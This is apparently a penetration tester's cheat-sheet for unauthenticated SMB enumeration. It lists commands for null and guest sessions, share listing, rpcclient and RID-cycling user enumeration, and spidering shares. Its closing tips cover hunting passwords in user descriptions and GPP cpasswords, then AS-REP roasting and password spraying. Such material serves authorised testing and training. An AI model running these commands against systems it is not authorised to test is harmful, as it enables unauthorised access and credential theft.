## Goal
Try null/guest sessions to list shares, users, and pull files without credentials. Free loot plus a user list to spray everywhere else.

**Checklist**
- [ ] null session lists shares? (-N)
- [ ] guest works if null doesn't?
- [ ] readable share with files?
- [ ] RID cycling / rpcclient yields a user list?

# Commands

### Step 1: List shares (null + guest)
```bash
smbclient -N -L //$IP                    # null session share list
nxc smb $ip -u '' -p '' --shares         # null, WITH read/write perms
nxc smb $ip -u 'guest' -p '' --shares    # guest fallback
smbmap -H $IP -u null                     # shares + access level
```

### Step 2: rpcclient null session (Windows user/group/policy enum)
```bash
rpcclient -U "" -N $IP
# inside:
enumdomusers            # ALL domain users (works even when smbclient is locked)
enumdomgroups           # groups
querydispinfo           # users + descriptions (passwords sometimes here!)
getdompwinfo            # password policy (check BEFORE spraying, avoid lockout)
lookupnames <user>      # username -> SID
queryuser <rid>         # detail on a user
```

### Step 3: RID cycling (build a user list)
```bash
nxc smb $IP -u '' -p '' --rid-brute
impacket-lookupsid anonymous@$IP
```

### Step 4: Access a share + pull everything
```bash
smbclient //$IP/<share> -N
# inside: same interactive commands as authenticated (dir/cd/get/mget) -> [[authenticated_enum]] Step 3
nxc smb $IP -u '' -p '' -M spider_plus    # auto-spider all readable shares
```

### Helpline
```bash
# WHAT SUCCESS LOOKS LIKE:
#   smbclient -N -L returns a share TABLE = null session allowed.
#   ACCESS_DENIED / STATUS_LOGON_FAILURE = blocked -> try guest, then move on.
#   SYSVOL + NETLOGON present = domain-joined -> check SYSVOL for GPP cpassword (smb_attacks).
#   a NON-default share (backups, dev, transfer, users) = the likely loot -> read it fully.
# rpcclient enumdomusers is the best FREE user list, often works when smbclient is locked down.
# querydispinfo descriptions sometimes say "temp password is ...", always read them.
# users found -> AS-REP roast (88_kerberos) + spray (nxc smb -u users.txt -p 'pass' --continue-on-success).
```
